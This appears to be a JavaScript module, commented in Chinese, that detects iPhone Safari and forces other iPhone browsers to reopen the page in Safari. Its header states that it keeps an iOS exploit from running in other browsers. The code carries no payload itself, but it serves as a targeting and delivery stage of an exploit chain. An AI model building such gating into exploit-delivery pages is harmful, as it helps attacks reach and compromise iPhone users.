/**
 * Safari强制跳转模块
 * 
 * 功能：
 * - 检测非Safari浏览器
 * - 强制使用Safari打开（x-safari-https协议）
 * - 防止在其他浏览器中执行exploit
 * 
 * 来源：iOS_Exploit_Code_Snippets.md 第40-50行
 */

/**
 * 检测是否为Safari浏览器
 * @returns {boolean}
 */
function isSafariBrowser() {
  try {
    const ua = navigator.userAgent;
    
    // 检查是否包含Safari标识
    if (!/Safari/.test(ua)) {
      return false;
    }
    
    // 排除Chrome（Chrome也包含Safari标识）
    if (/Chrome/.test(ua) || /CriOS/.test(ua)) {
      return false;
    }
    
    // 排除Firefox
    if (/Firefox/.test(ua) || /FxiOS/.test(ua)) {
      return false;
    }
    
    // 排除Edge
    if (/EdgiOS/.test(ua) || /Edge/.test(ua)) {
      return false;
    }
    
    // 检查window.safari对象（Safari特有）
    if (typeof window.safari !== 'undefined') {
      return true;
    }
    
    // 检查其他Safari特征
    const hasSafariFeatures = 
      'standalone' in navigator &&
      !('InstallTrigger' in window) &&
      !(typeof window.chrome === "object" && window.chrome !== null);
    
    return hasSafariFeatures;
  } catch (e) {
    return false;
  }
}

/**
 * 检测是否为iPhone
 * @returns {boolean}
 */
function isIphoneDevice() {
  try {
    const ua = navigator.userAgent;
    return /iPhone/.test(ua) && !(/iPad/.test(ua) || /iPod/.test(ua));
  } catch (e) {
    return false;
  }
}

/**
 * 强制使用Safari打开当前URL
 * 使用x-safari-https协议触发系统在Safari中打开
 */
function forceOpenInSafari() {
  try {
    const currentUrl = location.href;
    
    // 构造Safari专用URL scheme
    // x-safari-https:// 会强制在Safari中打开
    const safariUrl = currentUrl.replace(/^https?:\/\//, 'x-safari-https://');
    
    if (typeof print === 'function') {
      print('[Safari Redirect] Forcing Safari: ' + safariUrl);
    }
    
    // 尝试跳转
    location.href = safariUrl;
    
    // 备用方案：延迟后重定向到普通https
    setTimeout(() => {
      if (location.href === currentUrl) {
        // 如果还在当前页面，说明x-safari协议失败，直接跳转
        location.href = currentUrl.replace(/^x-safari-/, '');
      }
    }, 1000);
    
  } catch (e) {
    if (typeof print === 'function') {
      print('[Safari Redirect] Error: ' + e.message);
    }
  }
}

/**
 * Safari环境检测和强制跳转主函数
 * @returns {boolean} - true表示是Safari，可以继续执行；false表示已触发跳转
 */
function enforceSafariEnvironment() {
  try {
    // 检测浏览器类型
    const isBrowser = typeof browser !== "undefined";
    const isPhone = isIphoneDevice();
    const isSafari = isSafariBrowser();
    
    if (typeof print === 'function') {
      print('[Safari Enforce] Browser object exists: ' + isBrowser);
      print('[Safari Enforce] Is iPhone: ' + isPhone);
      print('[Safari Enforce] Is Safari: ' + isSafari);
    }
    
    // 如果检测到browser对象（可能是Firefox或其他浏览器扩展环境），跳过
    if (isBrowser) {
      if (typeof print === 'function') {
        print('[Safari Enforce] Browser extension detected, skipping');
      }
      return false;
    }
    
    // 如果不是iPhone，跳过
    if (!isPhone) {
      if (typeof print === 'function') {
        print('[Safari Enforce] Not iPhone device, skipping');
      }
      return false;
    }
    
    // 如果不是Safari，强制跳转
    if (!isSafari) {
      if (typeof print === 'function') {
        print('[Safari Enforce] Not Safari browser, forcing redirect...');
      }
      forceOpenInSafari();
      return false;
    }
    
    // 是Safari环境，可以继续
    if (typeof print === 'function') {
      print('[Safari Enforce] Safari environment confirmed, continuing...');
    }
    return true;
    
  } catch (e) {
    if (typeof print === 'function') {
      print('[Safari Enforce] Error: ' + e.message);
    }
    // 发生错误时假设是Safari环境，继续执行
    return true;
  }
}

/**
 * 获取浏览器详细信息（调试用）
 * @returns {Object}
 */
function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    vendor: navigator.vendor,
    appName: navigator.appName,
    appVersion: navigator.appVersion,
    hasSafariObject: typeof window.safari !== 'undefined',
    hasChromeObject: typeof window.chrome !== 'undefined',
    hasStandalone: 'standalone' in navigator,
    hasInstallTrigger: 'InstallTrigger' in window
  };
}

// 导出函数
if (typeof window !== 'undefined') {
  window.isSafariBrowser = isSafariBrowser;
  window.isIphoneDevice = isIphoneDevice;
  window.forceOpenInSafari = forceOpenInSafari;
  window.enforceSafariEnvironment = enforceSafariEnvironment;
  window.getBrowserInfo = getBrowserInfo;
}

if (typeof print === 'function') {
  print('[Safari Redirect] Module loaded');
  
  // 打印浏览器信息
  const info = getBrowserInfo();
  print('[Browser Info] UA: ' + info.userAgent.substring(0, 50) + '...');
  print('[Browser Info] Safari: ' + info.hasSafariObject + ', Chrome: ' + info.hasChromeObject);
}